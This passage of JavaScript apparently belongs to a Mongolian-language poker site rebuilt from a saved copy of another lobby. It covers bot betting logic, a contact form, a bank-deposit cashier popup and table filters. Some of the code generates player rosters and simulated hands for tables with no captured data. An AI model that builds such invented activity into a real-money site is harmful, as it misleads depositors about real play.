      function doCheck() { setAction(s, 'Check'); sfx(doc, 'check'); log(name + ' checks'); }
      function commit(target, label) {                   // raise/bet "to" target
        if (omaha) target = Math.min(target, currentBet + pot + Math.max(0, currentBet - s.bet)); // pot limit
        target = Math.min(target, s.bet + s.stack);
        var put = target - s.bet;
        s.stack -= put; pot += put; s.bet = target;
        if (s.bet > currentBet) currentBet = s.bet;
        setBet(s); setStack(s); sfx(doc, label === 'Bet' ? 'bet' : 'raise');
        if (s.stack <= 0) { s.stack = 0; setAction(s, 'All in'); log(name + ' goes all in (' + money(target) + ')'); }
        else { setAction(s, label); log(name + ' ' + (label === 'Bet' ? 'bets ' : 'raises to ') + money(target)); }
        // a bet/raise reopens the action: everyone still live must act again
        seats.forEach(function (x) { if (x !== s && !x.folded && !x.allIn) x.acted = false; });
        raises++;
      }
      function doCall() {
        var pay = Math.min(toCall, s.stack);
        s.stack -= pay; s.bet += pay; pot += pay;
        setBet(s); setStack(s); sfx(doc, 'call');
        if (s.stack <= 0) { s.stack = 0; setAction(s, 'All in'); log(name + ' calls all in (' + money(pay) + ')'); }
        else { setAction(s, 'Call'); log(name + ' calls ' + money(pay)); }
      }

      var openSize = roundBB((0.5 + Math.random() * 0.6) * (pot || bb));   // bet size
      var raiseTarget = currentBet + roundBB((0.7 + Math.random() * 0.8) * (pot || bb));
      var canRaise = raises < 4 && s.stack > toCall;

      if (toCall <= 0) {
        // nobody has bet: check, value-bet or bluff
        if (st > 0.6 && Math.random() < 0.82) commit(s.bet + openSize, 'Bet');
        else if (st < 0.4 && !preflop && Math.random() < 0.14) commit(s.bet + openSize, 'Bet'); // bluff
        else doCheck();
      } else if (allInToCall) {
        // calling would be for stack: need real strength or a great price
        if (st > 0.5 || odds < 0.28) doCall(); else doFold();
      } else if (st > 0.8 && canRaise && Math.random() < (preflop ? 0.45 : 0.6)) {
        commit(raiseTarget, 'Raise');                      // strong → value raise
      } else if (st > odds + (preflop ? 0.02 : 0.12) +
                 clamp(callCost / (s.stack || 1), 0, 0.6) * 0.45) {
        doCall();                   // priced in, and worth the stack commitment
      } else if (st < 0.33 && canRaise && !preflop && Math.random() < 0.08) {
        commit(raiseTarget, 'Raise');                      // occasional bluff raise
      } else {
        doFold();
      }

      if (s.stack <= 0 && !s.folded && !s.allIn) { s.stack = 0; s.allIn = true; setStack(s); setAllIn(s, true); }
      s.acted = true;
      if (potEl) potEl.textContent = 'Pot: ' + money(pot); setPotChips(pot);

      if (roundDone()) advanceStreet();
    }

    newHand();
    doc.__tvSimTimer = setInterval(step, 1900);
  }

  function openTable(row) {
    var v = document.getElementById('table-view');
    if (!v) {
      v = document.createElement('div');
      v.id = 'table-view';
      v.style.cssText = 'display:none;position:fixed;inset:0;top:0;left:0;width:100%;height:100%;z-index:10000;background:#111;';
      document.body.appendChild(v);
      document.addEventListener('keydown', function (e) {
        if (e.key === 'Escape') hideTable();
      });
    }

    // Collect the clicked table's details for the centre label.
    var info = null;
    if (row) {
      var txt = function (cls) {
        var e = row.querySelector('.' + cls + ' .text, .' + cls + ' .Table__body_item_text');
        return e ? e.textContent.trim() : '';
      };
      var limit = rowLimit(row);
      var limitLabel = limit === 'pot' ? 'Pot Limit' : limit === 'fixed' ? 'Fixed' : 'No Limit';
      info = {
        name:   txt('tct-name') || 'Table',
        game:   (txt('tct-game-type') || "Hold'em") + ' ' + limitLabel,
        stakes: txt('tct-stakes') || '',
        seated: parseInt(txt('tct-num-players'), 10) || 9
      };
    }

    // Already open → just switch to its tab; otherwise add a new tab.
    var name = info ? info.name : 'Table';
    var idx = -1;
    openTables.forEach(function (t, k) { if (((t.info && t.info.name) || 'Table') === name) idx = k; });
    if (idx < 0) {
      var frame = document.createElement('iframe');
      frame.title = 'Table';
      frame.style.cssText = 'width:100%;height:100%;border:0;display:none;';
      frame.__tableInfo = info;
      frame.addEventListener('load', function () {
        fitTable(frame);
        applyTableData(frame, frame.__tableInfo);
        try { wireTableButtons(frame.contentDocument); } catch (e) {}
        renderTableTabs();
      });
      frame.setAttribute('src', 'table.html');   // relative to /desktop/
      v.appendChild(frame);
      openTables.push({ info: info, frame: frame });
      idx = openTables.length - 1;
    }
    showTableAt(idx);
    v.style.display = 'block';
  }

  // Back to the lobby; open tables keep running and stay as tabs.
  function hideTable() {
    var v = document.getElementById('table-view');
    if (v) v.style.display = 'none';
  }

  // Clicking an empty seat's "Суух" button — sitting needs an account.
  function tableSit() {
    showLogin();
    var lp = document.getElementById('login-popup');
    if (lp) lp.style.zIndex = '10001';   // above the table overlay
  }

  /* ═══════════════════════════════════════
     2b. CONTACT ADMIN POPUP
  ═══════════════════════════════════════ */
  function buildContactPopup() {
    if (!document.getElementById('contact-css')) {
      var s = document.createElement('style');
      s.id = 'contact-css';
      s.textContent =
        '#contact-popup{display:none;position:fixed;top:0;left:0;width:100%;height:100%;z-index:10002;align-items:center;justify-content:center;}' +
        '#contact-modal{position:relative;background:#0a0a0f;border-radius:14px;width:min(94vw,640px);overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.8);}' +
        '#contact-modal .cm-header{display:flex;align-items:center;justify-content:space-between;padding:18px 22px 14px;}' +
        '#contact-modal .cm-title{color:#fff;font-size:15px;font-weight:700;letter-spacing:1px;text-transform:uppercase;}' +
        '#contact-modal .cm-close{background:none;border:none;color:rgba(255,255,255,.5);font-size:22px;cursor:pointer;line-height:1;padding:0;}' +
        '#contact-modal .cm-close:hover{color:#fff;}' +
        '#contact-modal .cm-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:1px;background:rgba(255,255,255,.07);border-top:1px solid rgba(255,255,255,.07);}' +
        '#contact-modal .cm-item{background:#0a0a0f;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:28px 12px 24px;cursor:pointer;gap:14px;transition:background .15s;}' +
        '#contact-modal .cm-item:hover{background:#14141f;}' +
        '#contact-modal .cm-item svg{width:56px;height:56px;}' +
        '#contact-modal .cm-item span{color:#fff;font-size:12px;text-align:center;line-height:1.4;font-weight:500;}' +
        '#contact-modal .cm-form-view{padding:22px 24px 24px;display:none;}' +
        '#contact-modal .cm-back{background:none;border:none;color:#d4ac0d;font-size:13px;cursor:pointer;padding:0 0 14px;display:flex;align-items:center;gap:5px;}' +
        '#contact-modal .cm-form-title{color:#fff;font-size:15px;font-weight:700;margin-bottom:16px;}' +
        '#contact-modal .cm-label{display:block;color:rgba(255,255,255,.55);font-size:12px;margin:10px 0 5px;}' +
        '#contact-modal .cm-input,#contact-modal .cm-textarea{width:100%;background:#1a1a2a;border:1px solid rgba(255,255,255,.1);border-radius:8px;color:#fff;padding:11px 14px;font-size:14px;box-sizing:border-box;outline:none;font-family:inherit;}' +
        '#contact-modal .cm-input:focus,#contact-modal .cm-textarea:focus{border-color:#d4ac0d;}' +
        '#contact-modal .cm-textarea{resize:vertical;min-height:90px;}' +
        '#contact-modal .cm-submit{margin-top:16px;width:100%;background:#d4ac0d;color:#1a1200;border:none;border-radius:8px;padding:13px;font-size:14px;font-weight:700;cursor:pointer;letter-spacing:.5px;}' +
        '#contact-modal .cm-submit:disabled{opacity:.5;}' +
        '#contact-modal .cm-success{text-align:center;padding:32px 0;color:#2ecc71;font-size:15px;font-weight:600;display:none;}' +
        '#contact-modal .cm-err{color:#e74c3c;font-size:12px;margin-top:8px;text-align:center;display:none;}';
      document.head.appendChild(s);
    }

    function icon(type) {
      var icons = {
        vip: '<svg viewBox="0 0 64 64" fill="none"><circle cx="32" cy="22" r="14" stroke="#d4ac0d" stroke-width="3"/><path d="M32 8l3 9h9l-7 5 3 9-8-6-8 6 3-9-7-5h9z" fill="#d4ac0d"/><path d="M14 42c0-3 8-5 18-5s18 2 18 5v6H14v-6z" fill="#d4ac0d" opacity=".3"/><rect x="20" y="48" width="24" height="4" rx="2" fill="#d4ac0d"/></svg>',
        deposit: '<svg viewBox="0 0 64 64" fill="none"><rect x="8" y="12" width="34" height="42" rx="4" stroke="#d4ac0d" stroke-width="3"/><path d="M8 20h34" stroke="#d4ac0d" stroke-width="2"/><path d="M16 30h18M16 38h12" stroke="#d4ac0d" stroke-width="2.5" stroke-linecap="round"/><circle cx="50" cy="44" r="10" fill="#0a0a0f" stroke="#d4ac0d" stroke-width="2.5"/><path d="M50 40v8M46 44h8" stroke="#d4ac0d" stroke-width="2" stroke-linecap="round"/></svg>',
        other: '<svg viewBox="0 0 64 64" fill="none"><rect x="10" y="8" width="30" height="38" rx="4" stroke="#d4ac0d" stroke-width="3"/><path d="M10 18h30" stroke="#d4ac0d" stroke-width="2"/><path d="M18 28h14M18 36h10" stroke="#d4ac0d" stroke-width="2.5" stroke-linecap="round"/><path d="M34 38l16 16" stroke="#d4ac0d" stroke-width="3" stroke-linecap="round"/><circle cx="48" cy="52" r="4" fill="#d4ac0d"/></svg>',
        status: '<svg viewBox="0 0 64 64" fill="none"><circle cx="28" cy="28" r="17" stroke="#d4ac0d" stroke-width="3"/><path d="M40 40l14 14" stroke="#d4ac0d" stroke-width="3" stroke-linecap="round"/><path d="M20 28l6 6 10-10" stroke="#d4ac0d" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg>',
        telegram: '<svg viewBox="0 0 64 64" fill="none"><circle cx="32" cy="32" r="26" fill="#229ED9"/><path d="M14 31l32-13-10 30-7-11-15-6z" fill="#fff" opacity=".3"/><path d="M14 31l32-13-10 30-7-11z" fill="#fff"/><path d="M28 42l3-8 7-6" stroke="#229ED9" stroke-width="2"/></svg>',
        app: '<svg viewBox="0 0 64 64" fill="none"><path d="M32 10L52 50H12L32 10z" fill="#00C853" opacity=".9"/><path d="M32 10L52 50H32V10z" fill="#00C853"/><path d="M32 10L12 50H32V10z" fill="#4CAF50" opacity=".7"/><circle cx="32" cy="10" r="4" fill="#fff"/><rect x="22" y="46" width="20" height="6" rx="3" fill="#d4ac0d"/></svg>'
      };
      return icons[type] || '';
    }

    var el = document.createElement('div');
    el.id = 'contact-popup';
    el.innerHTML =
      '<div id="contact-modal-bg" style="position:absolute;inset:0;background:rgba(0,0,0,.72);"></div>' +
      '<div id="contact-modal">' +
        '<div class="cm-header">' +
          '<span class="cm-title">Contact Admin</span>' +
          '<button class="cm-close" id="contact-close-btn">✕</button>' +
        '</div>' +
        '<div id="cm-grid-view">' +
          '<div class="cm-grid">' +
            '<div class="cm-item" data-kind="VIP эрх авах">' + icon('vip') + '<span>VIP эрх авах</span></div>' +
            '<div class="cm-item" data-kind="Оороогүй цэнэгийн хүсэлт">' + icon('deposit') + '<span>Оороогүй цэнэгийн<br>хүсэлт гаргах</span></div>' +
            '<div class="cm-item" data-kind="Бусад хүсэлт">' + icon('other') + '<span>Бусад хүсэлт<br>гаргах</span></div>' +
            '<div class="cm-item" id="cm-status-btn">' + icon('status') + '<span>Хүсэлтийн хариу<br>шалгах</span></div>' +
            '<div class="cm-item" id="cm-telegram-btn">' + icon('telegram') + '<span>Telegram чатанд<br>нэгдэх</span></div>' +
            '<div class="cm-item" id="cm-app-btn">' + icon('app') + '<span>Апп татах</span></div>' +
          '</div>' +
        '</div>' +
        '<div class="cm-form-view" id="cm-form-view">' +
          '<button class="cm-back" id="cm-back-btn">← Буцах</button>' +
          '<div class="cm-form-title" id="cm-form-title"></div>' +
          '<div id="cm-success" class="cm-success">✅ Таны хүсэлт амжилттай илгээгдлээ!</div>' +
          '<div id="cm-fields">' +
            '<label class="cm-label">Нэрэглэгчийн нэр</label>' +
            '<input id="cm-name" class="cm-input" type="text" placeholder="Нэр / хоч" autocomplete="off">' +
            '<label class="cm-label">Мэдэгдэл <span style="color:#e74c3c">*</span></label>' +
            '<textarea id="cm-message" class="cm-textarea" placeholder="Дэлгэрэнгүй бичнэ үү..."></textarea>' +
            '<div id="cm-err" class="cm-err"></div>' +
            '<button class="cm-submit" id="cm-submit-btn">ИЛГЭЭХ</button>' +
          '</div>' +
        '</div>' +
      '</div>';
    return el;
  }

  function showContact() {
    var p = document.getElementById('contact-popup');
    if (!p) return;
    document.getElementById('cm-grid-view').style.display = '';
    document.getElementById('cm-form-view').style.display = 'none';
    p.style.display = 'flex';
  }

  function hideContact() {
    var p = document.getElementById('contact-popup');
    if (p) p.style.display = 'none';
  }

  /* ═══════════════════════════════════════
     2c. КАСС (CASHIER) POPUP
  ═══════════════════════════════════════ */
  function buildCashierPopup() {
    if (!document.getElementById('cashier-css')) {
      var s = document.createElement('style');
      s.id = 'cashier-css';
      s.textContent =
        '#cashier-popup{display:none;position:fixed;top:0;left:0;width:100%;height:100%;z-index:10002;align-items:center;justify-content:center;}' +
        '#cashier-modal{position:relative;background:#0a0a0f;border-radius:14px;width:min(94vw,520px);overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.85);}' +
        '#cashier-modal .ch-header{display:flex;align-items:center;justify-content:space-between;padding:18px 22px 14px;border-bottom:1px solid rgba(255,255,255,.07);}' +
        '#cashier-modal .ch-title{color:#d4ac0d;font-size:15px;font-weight:700;letter-spacing:1px;text-transform:uppercase;display:flex;align-items:center;gap:8px;}' +
        '#cashier-modal .ch-close{background:none;border:none;color:rgba(255,255,255,.5);font-size:22px;cursor:pointer;line-height:1;padding:0;}' +
        '#cashier-modal .ch-close:hover{color:#fff;}' +
        '#cashier-modal .ch-body{padding:18px 22px 24px;}' +
        '#cashier-modal .ch-label{color:rgba(255,255,255,.45);font-size:11px;text-transform:uppercase;letter-spacing:.7px;margin-bottom:12px;}' +
        '#cashier-modal .ch-card{background:#14141f;border:1px solid rgba(212,172,13,.25);border-radius:10px;padding:16px 18px;margin-bottom:12px;cursor:pointer;transition:border-color .15s;}' +
        '#cashier-modal .ch-card:hover{border-color:#d4ac0d;}' +
        '#cashier-modal .ch-card:last-child{margin-bottom:0;}' +
        '#cashier-modal .ch-bank{font-size:12px;font-weight:700;color:#d4ac0d;margin-bottom:4px;}' +
        '#cashier-modal .ch-num{font-size:20px;font-weight:700;letter-spacing:1.5px;color:#fff;margin-bottom:3px;}' +
        '#cashier-modal .ch-holder{font-size:13px;color:rgba(255,255,255,.55);}' +
        '#cashier-modal .ch-note{font-size:12px;color:rgba(255,255,255,.35);margin-top:6px;}' +
        '#cashier-modal .ch-copy{float:right;background:rgba(212,172,13,.15);border:1px solid rgba(212,172,13,.3);color:#d4ac0d;border-radius:6px;font-size:11px;padding:3px 10px;cursor:pointer;}' +
        '#cashier-modal .ch-copy:hover{background:rgba(212,172,13,.3);}' +
        '#cashier-modal .ch-empty{color:rgba(255,255,255,.35);text-align:center;padding:32px 0;font-size:14px;}' +
        '#cashier-modal .ch-copied{color:#2ecc71;font-size:11px;float:right;padding:3px 10px;}';
      document.head.appendChild(s);
    }
    var el = document.createElement('div');
    el.id = 'cashier-popup';
    el.innerHTML =
      '<div id="cashier-bg" style="position:absolute;inset:0;background:rgba(0,0,0,.72);"></div>' +
      '<div id="cashier-modal">' +
        '<div class="ch-header">' +
          '<span class="ch-title">💳 Мөнгөний касс</span>' +
          '<button class="ch-close" id="cashier-close-btn">✕</button>' +
        '</div>' +
        '<div class="ch-body">' +
          '<div class="ch-label">Цэнэглэх данснууд</div>' +
          '<div id="cashier-accounts"><div class="ch-empty">Ачааллаж байна...</div></div>' +
        '</div>' +
      '</div>';
    return el;
  }

  function loadCashierAccounts() {
    fetch('/api/accounts')
      .then(function (r) { return r.json(); })
      .then(function (list) {
        var el = document.getElementById('cashier-accounts');
        if (!list || !list.length) {
          el.innerHTML = '<div class="ch-empty">Данс байхгүй байна. Дараа шалгана уу.</div>';
          return;
        }
        el.innerHTML = list.map(function (a, i) {
          return '<div class="ch-card">' +
            '<button class="ch-copy" data-num="' + a.number + '">Хуулах</button>' +
            '<div class="ch-bank">🏦 ' + a.bank + '</div>' +
            '<div class="ch-num">' + a.number + '</div>' +
            (a.holder ? '<div class="ch-holder">👤 ' + a.holder + '</div>' : '') +
            (a.note ? '<div class="ch-note">' + a.note + '</div>' : '') +
          '</div>';
        }).join('');
        el.querySelectorAll('.ch-copy').forEach(function (btn) {
          btn.addEventListener('click', function (e) {
            e.stopPropagation();
            var num = btn.getAttribute('data-num');
            navigator.clipboard.writeText(num).then(function () {
              btn.textContent = '✓ Хуулагдлаа';
              btn.className = 'ch-copied';
              setTimeout(function () { btn.textContent = 'Хуулах'; btn.className = 'ch-copy'; }, 2000);
            });
          });
        });
      })
      .catch(function () {
        document.getElementById('cashier-accounts').innerHTML = '<div class="ch-empty" style="color:#e74c3c">Серверт холбогдсонгүй.</div>';
      });
  }

  function showCashier() {
    var p = document.getElementById('cashier-popup');
    if (!p) return;
    p.style.display = 'flex';
    loadCashierAccounts();
  }

  function hideCashier() {
    var p = document.getElementById('cashier-popup');
    if (p) p.style.display = 'none';
  }

  /* ═══════════════════════════════════════
     3. BURGER MENU / SIDEBAR
  ═══════════════════════════════════════ */
  var sidebarInner   = null;
  var sidebarOuterEl = null;
  var sidebarHideTransform = 'translateX(-100%)';

  function buildSidebarParts() {
    /* overlay — Sidebar__outer доторх */
    var overlay = document.createElement('div');
    overlay.id  = 'sidebar-overlay';
    overlay.className = 'Sidebar__overlay';
    overlay.style.cssText = 'width:100%;height:100%;pointer-events:initial;cursor:default;';

    /* inner panel */
    var inner = document.createElement('div');
    inner.id  = 'sidebar-inner';
    inner.className = 'Sidebar__inner no-swiping';
    inner.style.cssText = 'transform:' + sidebarHideTransform + ';transition:transform 200ms ease-out;z-index:1001;';

    inner.innerHTML = [
      '<div class="Sidebar__back_button_block top">',
        '<div id="sidebar-close-btn"',
        '     class="panel button SimpleButton SimpleButton_v_text SimpleButton_c_blue',
        '            SimpleButton_use_text_use_icon Sidebar__back_button SimpleButton_interactive"',
        '     tabindex="-1">',
          '<div class="SimpleButton__content">',
            '<div class="panel Icon Icon_v_default Icon_c_white Icon_val_back_arrow SimpleButton__icon" tabindex="-1">',
              '<div class="Icon__content"></div>',
            '</div>',
            '<div class="SimpleButton__text">Буцах</div>',
          '</div>',
        '</div>',
      '</div>',
      '<div class="Sidebar__content">',
        '<div class="scroll-panel" style="position:relative;height:100%;width:100%;overflow:hidden;touch-action:none;">',
          '<div class="scroll-wrapper" style="transform:translate(0px,0px) translateZ(0px)">',
            '<div class="LobbySidebarContainer__actions">',

              '<div id="sidebar-settings-btn"',
              '     class="panel button SimpleButton SimpleButton_v_text SimpleButton_c_light',
              '            SimpleButton_use_text_use_icon LobbySidebarContainer__action settings SimpleButton_interactive"',
              '     tabindex="-1">',
                '<div class="SimpleButton__content">',
                  '<div class="panel Icon Icon_v_default Icon_c_white Icon_val_settings_2 SimpleButton__icon LobbySidebarContainer__action__icon" tabindex="-1">',
                    '<div class="Icon__content"></div>',
                  '</div>',
                  '<div class="SimpleButton__text">Тохиргоо</div>',
                '</div>',
              '</div>',

              '<div id="sidebar-install-btn"',
              '     class="panel button SimpleButton SimpleButton_v_text SimpleButton_c_light',
              '            SimpleButton_use_text_use_icon LobbySidebarContainer__action install-app SimpleButton_interactive"',
              '     tabindex="-1">',
                '<div class="SimpleButton__content">',
                  '<div class="panel Icon Icon_v_default Icon_c_white Icon_val_install_app SimpleButton__icon LobbySidebarContainer__action__icon" tabindex="-1">',
                    '<div class="Icon__content"></div>',
                  '</div>',
                  '<div class="SimpleButton__text">Апп суулгах</div>',
                '</div>',
              '</div>',

              '<div id="sidebar-about-btn"',
              '     class="panel button SimpleButton SimpleButton_v_text SimpleButton_c_light',
              '            SimpleButton_use_text_use_icon LobbySidebarContainer__action about SimpleButton_interactive"',
              '     tabindex="-1">',
                '<div class="SimpleButton__content">',
                  '<div class="panel Icon Icon_v_default Icon_c_white Icon_val_info_btn SimpleButton__icon LobbySidebarContainer__action__icon" tabindex="-1">',
                    '<div class="Icon__content"></div>',
                  '</div>',
                  '<div class="SimpleButton__text">Тухай</div>',
                '</div>',
              '</div>',

              '<div id="sidebar-contact-btn"',
              '     class="panel button SimpleButton SimpleButton_v_text SimpleButton_c_light',
              '            SimpleButton_use_text_use_icon LobbySidebarContainer__action contact SimpleButton_interactive"',
              '     tabindex="-1">',
                '<div class="SimpleButton__content">',
                  '<div class="panel Icon Icon_v_default Icon_c_white Icon_val_support SimpleButton__icon LobbySidebarContainer__action__icon" tabindex="-1">',
                    '<div class="Icon__content"></div>',
                  '</div>',
                  '<div class="SimpleButton__text">Холбоо барих</div>',
                '</div>',
              '</div>',

            '</div>',
          '</div>',
        '</div>',
      '</div>',
    ].join('');

    return { overlay: overlay, inner: inner };
  }

  function openSidebar() {
    if (!sidebarInner || !sidebarOuterEl) return;
    sidebarOuterEl.style.display = 'block';
    sidebarInner.getBoundingClientRect(); /* force reflow */
    sidebarInner.style.transform = 'translateX(0)';
  }

  function closeSidebar(cb) {
    if (!sidebarInner || !sidebarOuterEl) return;
    sidebarInner.style.transform = sidebarHideTransform;
    setTimeout(function () {
      sidebarOuterEl.style.display = 'none';
      if (typeof cb === 'function') cb();
    }, 220);
  }

  /* ═══════════════════════════════════════
     4. TABLE SCROLL
  ═══════════════════════════════════════ */
  function initScroll(panel) {
    var wrapper = panel.querySelector('.scroll-wrapper');
    if (!wrapper) return;

    var isDragging = false;
    var startY     = 0;
    var currentY   = 0;
    var velocity   = 0;
    var lastY      = 0;
    var lastTime   = 0;
    var rafId      = null;

    function getMax() {
      return Math.max(0, wrapper.scrollHeight - panel.clientHeight);
    }
    function clamp(v, lo, hi) { return Math.max(lo, Math.min(hi, v)); }
    function move(y) {
      wrapper.style.transform = 'translate(0px,' + y + 'px) translateZ(0px)';
    }
    function momentum() {
      velocity *= 0.92;
      currentY  = clamp(currentY + velocity, -getMax(), 0);
      move(currentY);
      if (Math.abs(velocity) > 0.4) rafId = requestAnimationFrame(momentum);
    }

    panel.addEventListener('mousedown', function (e) {
      cancelAnimationFrame(rafId);
      isDragging = true; startY = e.clientY - currentY;
      lastY = e.clientY; lastTime = Date.now(); velocity = 0;
      e.preventDefault();
    });
    window.addEventListener('mousemove', function (e) {
      if (!isDragging) return;
      var now = Date.now();
      velocity = (e.clientY - lastY) / (now - lastTime || 1) * 16;
      lastY = e.clientY; lastTime = now;
      currentY = clamp(e.clientY - startY, -getMax(), 0);
      move(currentY);
    });
    window.addEventListener('mouseup', function () {
      if (!isDragging) return;
      isDragging = false;
      rafId = requestAnimationFrame(momentum);
    });
    panel.addEventListener('wheel', function (e) {
      e.preventDefault();
      cancelAnimationFrame(rafId);
      currentY = clamp(currentY - e.deltaY, -getMax(), 0);
      move(currentY);
      velocity = -e.deltaY * 0.25;
      rafId = requestAnimationFrame(momentum);
    }, { passive: false });
    panel.addEventListener('touchstart', function (e) {
      cancelAnimationFrame(rafId);
      isDragging = true;
      startY = e.touches[0].clientY - currentY;
      lastY = e.touches[0].clientY; lastTime = Date.now(); velocity = 0;
    }, { passive: true });
    panel.addEventListener('touchmove', function (e) {
      if (!isDragging) return;
      var now = Date.now();
      velocity = (e.touches[0].clientY - lastY) / (now - lastTime || 1) * 16;
      lastY = e.touches[0].clientY; lastTime = now;
      currentY = clamp(e.touches[0].clientY - startY, -getMax(), 0);
      move(currentY);
    }, { passive: true });
    panel.addEventListener('touchend', function () {
      isDragging = false;
      rafId = requestAnimationFrame(momentum);
    });
    panel.style.cursor = 'grab';
  }

  /* ═══════════════════════════════════════
     5. TAB HELPER
  ═══════════════════════════════════════ */
  function setActive(group, clicked) {
    group.forEach(function (el) {
      el.classList.remove('TabButton_selected', 'disable');
      el.classList.add('TabButton_interactive');
    });
    clicked.classList.add('TabButton_selected', 'disable');
    clicked.classList.remove('TabButton_interactive');
  }

  /* ═══════════════════════════════════════
     6. TABLE FILTERING
  ═══════════════════════════════════════ */
  var currentGameType = 'all';
  var currentLimit = 'any';
  var onTournaments = false;  // Tournaments таб дээр ширээ харуулахгүй
  var searchText = '';      // доод талын Search талбар
  var showEmpty  = true;    // "Empty" switch — унтраавал хоосон (0/N) ширээ нуугдана
  var showFull   = true;    // "Full" switch — унтраавал дүүрэн (N/N) ширээ нуугдана

  function rowSeats(row) {
    var el = row.querySelector('.tct-num-players .Table__body_item_text, .tct-num-players .text');
    var m = el ? el.textContent.match(/(\d+)\s*\/\s*(\d+)/) : null;
    return m ? { seated: +m[1], max: +m[2] } : null;
  }

  function rowName(row) {
    var el = row.querySelector('.tct-name .text, .tct-name .Table__body_item_text');
    return (el ? el.textContent : '').toLowerCase();
  }

  // Saved page has no limit data per row: read it from the name/stakes text,
  // otherwise treat the table as No Limit (the default for Texas Hold'em).
  function rowLimit(row) {
    var t = (row.textContent || '').toLowerCase();
    if (/pot[\s-]?limit|\bpl\b/.test(t)) return 'pot';
    if (/fixed/.test(t)) return 'fixed';
    return 'no';
  }

  function seatsAllowed(row) {
    var st = rowSeats(row);
    if (!st) return true;
    if (!showEmpty && st.seated === 0) return false;
    if (!showFull && st.seated >= st.max) return false;
    return true;
  }

  function filterTables() {
    document.querySelectorAll('.CashTablesContainer__table .Table__body_row_wrapper').forEach(function (w) {
      var row   = w.querySelector('.Table__body_row_table');
      var match = !onTournaments && (!row || (
        (currentGameType === 'all' || row.classList.contains('gf-' + currentGameType)) &&
        (currentLimit === 'any' || rowLimit(row) === currentLimit) &&
        (!searchText || rowName(row).indexOf(searchText) >= 0) &&
        seatsAllowed(row)));
      w.style.display = match ? '' : 'none';
    });
  }

  // Column sort: click a header cell to toggle asc/desc.
  function sortValue(row, cls) {
    var el = row.querySelector('.' + cls + ' .text, .' + cls + ' .Table__body_item_text');
    var t = el ? el.textContent.trim() : '';
    var nums = t.replace(/,/g, '').match(/\d+(\.\d+)?/g);
    if (cls === 'tct-stakes') return nums ? parseFloat(nums[nums.length > 1 ? 1 : 0]) : 0;
    if (cls === 'tct-name' || cls === 'tct-game-type') return t.toLowerCase();
    return nums ? parseFloat(nums[0]) : 0;
  }

  function initSort() {
    var table = document.querySelector('.CashTablesContainer__table');
    if (!table) return;
    var body = table.querySelector('.Table__body');
    var heads = Array.from(table.querySelectorAll('.Table__head_item'));
    heads.forEach(function (head) {
      var cls = Array.from(head.classList).filter(function (c) { return /^tct-/.test(c); })[0];
      if (!cls || cls === 'tct-action') return;
      head.style.cursor = 'pointer';
      head.addEventListener('click', function () {
        var cell = head.querySelector('.Table__head_cell');
        var dir = cell.classList.contains('asc') ? 'desc' : 'asc';
        heads.forEach(function (h) {
          var c = h.querySelector('.Table__head_cell');
          if (c) c.classList.remove('asc', 'desc');
        });
        cell.classList.add(dir);
        var wrappers = Array.from(body.querySelectorAll('.Table__body_row_wrapper'));
        if (!wrappers.length) return;
        var parent = wrappers[0].parentNode;
        var keyed = wrappers.map(function (w, i) {
          var row = w.querySelector('.Table__body_row_table');
          return { w: w, i: i, v: row ? sortValue(row, cls) : '' };
        });
        keyed.sort(function (a, b) {
          var r = a.v < b.v ? -1 : a.v > b.v ? 1 : 0;
          return (dir === 'asc' ? r : -r) || a.i - b.i;
        });
        keyed.forEach(function (k) { parent.appendChild(k.w); });
      });
    });
  }

  /* ═══════════════════════════════════════
     6b. TABLE INFO PANEL (desktop)
  ═══════════════════════════════════════ */
  // Real player data exists only for the table captured in the saved page;
  // other tables show their row data and hide player names.
  function initTableInfo() {
    var panel = document.querySelector('.LobbyCashTablesMenuContainer');
    if (!panel) return null;
    var header = panel.querySelector('.LobbyCashTablesMenuContainer__header__text') ||
                 panel.querySelector('.LobbyCashTablesMenuContainer__header');
    var list = panel.querySelector('.LobbyCashTablesMenuContainer__table .scroll-wrapper');
    var mini = panel.querySelector('.MiniTable');
    if (!header || !list || !mini) return null;

    var original = {
      title: header.textContent.trim(),
      list: list.innerHTML,
      mini: mini.innerHTML,
      miniClass: mini.className
    };

    function cellText(row, cls) {
      var el = row.querySelector('.' + cls + ' .text, .' + cls + ' .Table__body_item_text');
      return el ? el.textContent.trim() : '';
    }

    function restore() {
      header.textContent = original.title;
      list.innerHTML = original.list;
      mini.innerHTML = original.mini;
      mini.className = original.miniClass;
    }

    function show(row) {
      var name = cellText(row, 'tct-name');
      list.style.transform = 'translate(0px, 0px) translateZ(0px)';
      restore();
      if (name === original.title) return;   // captured table keeps its real data

      header.textContent = name;

      var stakes = cellText(row, 'tct-stakes');
      var parts = stakes.replace(/,/g, '').split('/');
      var bb = parseFloat(parts[1] || parts[0]) || 100;
      var seatsTxt = cellText(row, 'tct-num-players').split('/');
      var seated = parseInt(seatsTxt[0], 10) || 0;
      var maxSeats = parseInt(seatsTxt[1], 10) || 9;
      var roster = tableRoster(name, bb, seated);

      // Player list (NAME · COUNTRY · CASH)
      list.innerHTML = roster.map(function (p) {
        return '<div class="Table__body_row_wrapper"><div class="viewable-monitor">' +
          '<div class="panel Table__body_row Table__body_row_table" tabindex="-1">' +
            '<div class="Table__body_item Table__column player-name"><div class="Table__body_item_text">' +
              '<div class="panel LobbyCashTablesMenuContainer__player_mark no_color no_text"></div>' +
              '<div class="name-text">' + p.name + '</div></div></div>' +
            '<div class="Table__body_item Table__column player-country"><div class="Table__body_item_text">' +
              '<div class="panel Icon Icon_v_default Icon_c_white Icon_val_flag_icon_mn LobbyCashTablesMenuContainer__country_flag"><div class="Icon__content"></div></div>' +
            '</div></div>' +
            '<div class="Table__body_item Table__column player-cash"><div class="Table__body_item_text">' + fmtMoney(p.stack) + '</div></div>' +
          '</div></div></div>';
      }).join('');

      // Mini table preview
      var isOmaha = row.classList.contains('gf-omaha');
      mini.className = original.miniClass.replace(/\bgt-\w+/, isOmaha ? 'gt-omaha' : 'gt-holdem');
      var tableText = mini.querySelector('.MiniTable__table_text__content');
      if (tableText) tableText.textContent = 'Blinds: ' + stakes;

      var seats = Array.from(mini.querySelectorAll('.MiniTableSeat')).sort(function (a, b) {
        var n = function (el) { return +((el.className.match(/seat-template-(\d+)/) || [0, 0])[1]); };
        return n(a) - n(b);
      });
      seats.forEach(function (seat, i) {
